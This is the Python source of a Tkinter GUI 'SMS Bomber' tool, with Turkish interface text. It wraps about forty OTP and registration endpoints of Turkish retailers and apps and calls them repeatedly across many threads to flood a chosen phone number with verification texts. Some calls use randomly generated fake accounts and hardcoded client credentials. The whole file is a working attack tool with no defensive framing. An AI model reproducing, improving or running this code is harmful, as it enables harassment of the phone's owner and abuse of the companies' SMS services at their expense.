import requests
import random
import string
import json
import time
import uuid
import urllib.parse
import threading
import tkinter as tk
from tkinter import ttk, messagebox


def a101(number):
    try:
        url = "https://www.a101.com.tr/users/otp-login/"
        payload = {"phone": f"0{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 200, "A101"
    except: return False, "A101"

def bim(number):
    try:
        url = "https://bim.veesk.net/service/v1.0/account/login"
        payload = {"phone": f"90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 200, "BIM"
    except: return False, "BIM"

def defacto(number):
    try:
        url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
        payload = {"mobilePhone": f"0{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("Data") == "IsSMSSend", "Defacto"
    except: return False, "Defacto"

def istegelsin(number):
    try:
        url = "https://prod.fasapi.net/"
        payload = {
            "query": "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
            "variables": {"phoneNumber": f"90{number}"}
        }
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 200, "İsteGelsin"
    except: return False, "İsteGelsin"

def ikinciyeni(number):
    try:
        url = "https://apigw.ikinciyeni.com/RegisterRequest"
        payload = {
            "accountType": 1,
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
            "isAddPermission": False,
            "name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "lastName": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "phone": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("isSucceed") == True, "İkinci Yeni"
    except: return False, "İkinci Yeni"

def migros(number):
    try:
        url = "https://www.migros.com.tr/rest/users/login/otp"
        payload = {"phoneNumber": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("successful") == True, "Migros"
    except: return False, "Migros"

def ceptesok(number):
    try:
        url = "https://api.ceptesok.com/api/users/sendsms"
        payload = {"mobile_number": f"{number}", "token_type": "register_token"}
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 200, "Cepte Şok"
    except: return False, "Cepte Şok"

def tiklagelsin(number):
    try:
        url = "https://www.tiklagelsin.com/user/graphql"
        payload = {
            "operationName": "GENERATE_OTP",
            "variables": {"phone": f"+90{number}", "challenge": f"{uuid.uuid4()}", "deviceUniqueId": f"web_{uuid.uuid4()}"},
            "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 200, "Tıkla Gelsin"
    except: return False, "Tıkla Gelsin"

def bisu(number):
    try:
        url = "https://www.bisu.com.tr/api/v2/app/authentication/phone/register"
        payload = {"phoneNumber": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 200, "BiSU"
    except: return False, "BiSU"

def file(number):
    try:
        url = "https://api.filemarket.com.tr/v1/otp/send"
        payload = {"mobilePhoneNumber": f"90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("data") == "200 OK", "File"
    except: return False, "File"

def ipragraz(number):
    try:
        url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
        payload = {"otp": "", "phoneNumber": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 200, "İpragaz"
    except: return False, "İpragaz"

def pisir(number):
    try:
        url = "https://api.pisir.com/v1/login/"
        payload = {"msisdn": f"90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("ok") == "1", "Pişir"
    except: return False, "Pişir"

def coffy(number):
    try:
        url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode"
        payload = {"phoneNumber": f"+90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("success") == True, "Coffy"
    except: return False, "Coffy"

def sushico(number):
    try:
        url = "https://api.sushico.com.tr/tr/sendActivation"
        payload = {"phone": f"+90{number}", "location": 1, "locale": "tr"}
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("err") == 0, "SushiCo"
    except: return False, "SushiCo"

def kalmasin(number):
    try:
        url = "https://api.kalmasin.com.tr/user/login"
        payload = {"dil": "tr", "device_id": "", "notification_mobile": "android", "platform": "android", "version": "2.0.6", "login_type": 1, "telefon": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("success") == True, "Kalmasın"
    except: return False, "Kalmasın"

def yotto(number):
    try:
        url = "https://42577.smartomato.ru/account/session.json"
        payload = {"phone": f"+90 ({str(number)[0:3]}) {str(number)[3:6]}-{str(number)[6:10]}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 201, "Yotto"
    except: return False, "Yotto"

def qumpara(number):
    try:
        url = "https://tr-api.fisicek.com/v1.4/auth/getOTP"
        payload = {"msisdn": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 200, "Qumpara"
    except: return False, "Qumpara"

def aygaz(number):
    try:
        url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
        payload = {"Gsm": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 200, "Aygaz"
    except: return False, "Aygaz"

def pawapp(number):
    try:
        url = "https://api.pawder.app/api/authentication/sign-up"
        payload = {
            "languageId": "2", "mobileInformation": "",
            "data": {"firstName": "test", "lastName": "test", "userAgreement": "true", "kvkk": "true", "email": f"{random.randint(1000,9999)}@gmail.com", "phoneNo": f"{number}", "username": f"user{random.randint(1000,9999)}"}
        }
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("success") == True, "PawAPP"
    except: return False, "PawAPP"

def mopas(number):
    try:
        url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
        r = requests.post(url=url, timeout=3)
        if r.status_code == 200:
            res_json = json.loads(r.text)
            token = res_json.get("access_token")
            token_type = res_json.get("token_type")
            u2 = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber={number}"
            r1 = requests.get(url=u2, headers={"authorization": f"{token_type} {token}"}, timeout=3)
            return r1.status_code == 200, "Mopaş"
        return False, "Mopaş"
    except: return False, "Mopaş"

def paybol(number):
    try:
        url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms"
        payload = {"otp_code": "null", "phone_number": f"90{number}", "reference_id": "null"}
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 200, "Paybol"
    except: return False, "Paybol"

def ninewest(number):
    try:
        url = "https://www.ninewest.com.tr/webservice/v1/register.json"
        payload = {
            "alertMeWithEMail": False, "alertMeWithSms": False, "dataPermission": True,
            "email": f"t{random.randint(1000,9999)}@gmail.com", "genderId": 1, "hash": "5488b0f6de",
            "inviteCode": "", "password": "PassWord123!", "phoneNumber": f"({str(number)[0:3]}) {str(number)[3:6]} {str(number)[6:8]} {str(number)[8:10]}",
            "registerContract": True, "registerMethod": "mail", "version": "3"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("success") == True, "Nine West"
    except: return False, "Nine West"

def saka(number):
    try:
        url = "https://mobilcrm2.saka.com.tr/api/customer/login"
        payload = {"gsm": f"0{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("status") == 1, "Saka"
    except: return False, "Saka"

def hayat(number):
    try:
        url = f"https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber={number}"
        r = requests.post(url=url, timeout=5)
        return json.loads(r.text).get("IsSuccessful") == True, "Hayat"
    except: return False, "Hayat"

def tazi(number):
    try:
        url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
        payload = {"cep_tel": f"{number}", "cep_tel_ulkekod": "90"}
        headers = {"authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        return r.status_code == 200, "Tazı"
    except: return False, "Tazı"

def gofody(number):
    try:
        url = "https://backend.gofody.com/api/v1/enduser/register/"
        payload = {"country_code": "90", "phone": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("success") == True, "GoFody"
    except: return False, "GoFody"

def scooby(number):
    try:
        url = f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{number}"
        r = requests.get(url=url, timeout=5)
        return r.status_code == 200, "Scooby"
    except: return False, "Scooby"

def gez(number):
    try:
        url = f"https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{number}"
        r = requests.get(url=url, timeout=5)
        return json.loads(r.text).get("succeeded") == True, "Gez"
    except: return False, "Gez"

def jetle(number):
    try:
        url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={number}&firmaID=1048"
        r = requests.get(url=url, timeout=5)
        return r.status_code == 200, "Jetle"
    except: return False, "Jetle"

def rabbit(number):
    try:
        url = "https://api.rbbt.com.tr/v1/auth/authenticate"
        payload = {"mobile_number": f"+90{number}", "os_name": "android", "os_version": "7.1.2", "app_version": "1.0.2(12)", "push_id": "-"}
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("status") == True, "Rabbit"
    except: return False, "Rabbit"

def roombadi(number):
    try:
        url = "https://api.roombadi.com/api/v1/auth/otp/authenticate"
        payload = {"phone": f"{number}", "countryId": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 200, "Roombadi"
    except: return False, "Roombadi"

def hizliecza(number):
    try:
        url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP"
        payload = {"phoneNumber": f"+90{number}", "otpOperationType": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("isSuccess") == True, "Hızlı Ecza"
    except: return False, "Hızlı Ecza"

def goyakit(number):
    try:
        url = f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={number}&isRegistered=false"
        r = requests.get(url=url, timeout=5)
        return json.loads(r.text).get("data", {}).get("success") == True, "Go Yakıt"
    except: return False, "Go Yakıt"

def pinar(number):
    try:
        url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp"
        payload = {"MobilePhone": f"{number}"}
        r = requests.post(url=url, headers={"devicetype": "android"}, json=payload, timeout=5)
        return r.text.lower() == "true", "Pınar"
    except: return False, "Pınar"

def oliz(number):
    try:
        url = "https://api.oliz.com.tr/api/otp/send"
        payload = {"mobile_number": f"{number}", "type": None}
        r = requests.post(url=url, json=payload, timeout=5)
        return "SUCCESS_SEND_SMS" in r.text, "Oliz"
    except: return False, "Oliz"

def macrocenter(number):
    try:
        url = f"https://www.macrocenter.com.tr/rest/users/login/otp?reid={int(time.time())}"
        payload = {"phoneNumber": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("successful") == True, "Macro Center"
    except: return False, "Macro Center"

def marti(number):
    try:
        url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
        payload = {"mobilePhone": f"{number}", "mobilePhoneCountryCode": "90"}
        r = requests.post(url=url, json=payload, timeout=5)
        return json.loads(r.text).get("isSuccess") == True, "Martı"
    except: return False, "Martı"

def karma(number):
    try:
        url = "https://api.gokarma.app/v1/auth/send-sms"
        payload = {"phoneNumber": f"90{number}", "type": "REGISTER", "deviceId": f"{uuid.uuid4().hex[:16]}", "language": "tr-TR"}
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 201, "Karma"
    except: return False, "Karma"

def hop(number):
    try:
        url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
        payload = {"phone": f"+90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 201, "Hop"
    except: return False, "Hop"

def anadolu(number):
    try:
        url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php"
        payload = urllib.parse.urlencode({"Numara": f"{number}"})
        r = requests.post(url=url, headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, data=payload, timeout=5)
        return r.status_code == 200, "Anadolu"
    except: return False, "Anadolu"

def total(number):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    try:
        url = f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={number}"
        r = requests.post(url=url, verify=False, timeout=5)
        return json.loads(r.text).get("success") == True, "Total"
    except: return False, "Total"

def englishhome(number):
    try:
        url = "https://www.englishhome.com:443/enh_app/users/registration/"
        payload = {
            "first_name": "Test", "last_name": "Test", "email": f"t{random.randint(1000,9999)}@gmail.com",
            "phone": f"0{number}", "password": "Password123!", "email_allowed": False, "sms_allowed": False, "confirm": True, "tom_pay_allowed": True
        }
        r = requests.post(url=url, json=payload, timeout=5)
        return r.status_code == 202, "English Home"
    except: return False, "English Home"

def petrolofisi(number):
    try:
        url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
        payload = {
            "approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "",
            "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{number}", "name": "Test",
            "plate": f"34ABC123", "positiveCard": "", "referenceCode": "", "surname": "Test"
        }
        r = requests.post(url=url, headers={"X-Channel": "IOS"}, json=payload, timeout=5)
        return r.status_code == 204, "Petrol Ofisi"
    except: return False, "Petrol Ofisi"

ALL_FUNCTIONS = [
    a101, bim, defacto, istegelsin, ikinciyeni, migros, ceptesok, tiklagelsin, bisu, file,
    ipragraz, pisir, coffy, sushico, kalmasin, yotto, qumpara, aygaz, pawapp, mopas,
    paybol, ninewest, saka, hayat, tazi, gofody, scooby, gez, jetle, rabbit, roombadi,
    hizliecza, goyakit, pinar, oliz, macrocenter, marti, karma, hop, anadolu, total, englishhome, petrolofisi
]


class SMSBomberApp:
    def __init__(self, root):
        self.root = root
        self.root.title(" MORPH -  SMS Bomber Tool")
        self.root.geometry("600x500")
        self.root.config(bg="#121212")

        self.is_running = False
        self.success_count = 0
        self.fail_count = 0

        self.create_widgets()

    def create_widgets(self):
        # Başlık
        lbl_title = tk.Label(self.root, text="MORPH- SMS Bomber Tool", font=("Arial", 16, "bold"), fg="#00ffcc", bg="#121212")
        lbl_title.pack(pady=15)

        # Girdi Alanları Frame
        frame_inputs = tk.Frame(self.root, bg="#1e1e1e", padx=20, pady=20)
        frame_inputs.pack(fill=tk.X, padx=20, pady=10)

        tk.Label(frame_inputs, text="Telefon Numarası (Örn: 532xxxxxxx):", fg="white", bg="#1e1e1e", font=("Arial", 10)).anchor(tk.W)
        self.ent_number = tk.Entry(frame_inputs, font=("Arial", 12), bg="#2f3542", fg="white", insertbackground="white")
        self.ent_number.pack(fill=tk.X, pady=5)

        tk.Label(frame_inputs, text="Thread (İş Parçacığı) Sayısı:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(anchor=tk.W, pady=(10, 0))
        self.ent_threads = tk.Entry(frame_inputs, font=("Arial", 12), bg="#2f3542", fg="white", insertbackground="white")
        self.ent_threads.insert(0, "20")
        self.ent_threads.pack(fill=tk.X, pady=5)

        # Butonlar
        frame_btns = tk.Frame(self.root, bg="#121212")
        frame_btns.pack(pady=15)

        self.btn_start = tk.Button(frame_btns, text="SALDIRIYI BAŞLAT", font=("Arial", 11, "bold"), bg="#2ed573", fg="black", width=18, command=self.start_attack)
        self.btn_start.pack(side=tk.LEFT, padx=10)

        self.btn_stop = tk.Button(frame_btns, text="DURDUR", font=("Arial", 11, "bold"), bg="#ff4757", fg="white", width=18, state=tk.DISABLED, command=self.stop_attack)
        self.btn_stop.pack(side=tk.RIGHT, padx=10)

        # Log & İstatistik Ekranı
        self.lbl_stats = tk.Label(self.root, text="Başarılı: 0 | Başarısız: 0", font=("Arial", 11, "bold"), fg="#ffaa00", bg="#121212")
        self.lbl_stats.pack(pady=5)

        self.txt_logs = tk.Text(self.root, bg="#1e1e1e", fg="#00ffcc", font=("Consolas", 9), insertbackground="white")
        self.txt_logs.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

    def log(self, text):
        self.txt_logs.insert(tk.END, text + "\n")
        self.txt_logs.see(tk.END)

    def start_attack(self):
        number = self.ent_number.get().strip()
        if len(number) != 10 or not number.startswith("5"):
            messagebox.showerror("Hata", "Lütfen başında 0 olmadan geçerli bir 10 haneli numara girin (Örn: 5321234567)")
            return

        try:
            threads_count = int(self.ent_threads.get())
        except:
            threads_count = 20

        self.is_running = True
        self.success_count = 0
        self.fail_count = 0
        self.btn_start.config(state=tk.DISABLED)
        self.btn_stop.config(state=tk.NORMAL)

        self.log(f"[*] {number} numarasına SMS gönderimi başlatıldı...")
        threading.Thread(target=self.run_bomber, args=(number, threads_count), daemon=True).start()

    def stop_attack(self):
        self.is_running = False
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)
        self.log("[*] Durdurma sinyali gönderildi.")

    def run_bomber(self, number, max_workers):
        from concurrent.futures import ThreadPoolExecutor
        
        def worker():
            while self.is_running:
                func = random.choice(ALL_FUNCTIONS)
                try:
                    success, name = func(number)
                    if success:
                        self.success_count += 1
                        self.log(f"[+] Başarılı -> {name}")
                    else:
                        self.fail_count += 1
                        self.log(f"[-] Başarısız -> {name}")
                except:
                    self.fail_count += 1
                
                self.root.after(0, self.update_stats)
                time.sleep(0.5)

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            for _ in range(max_workers):
                if not self.is_running: break
                executor.submit(worker)

    def update_stats(self):
        self.lbl_stats.config(text=f"Başarılı: {self.success_count} | Başarısız: {self.fail_count}")

if __name__ == "__main__":
    root = tk.Tk()
    app = SMSBomberApp(root)
    root.mainloop()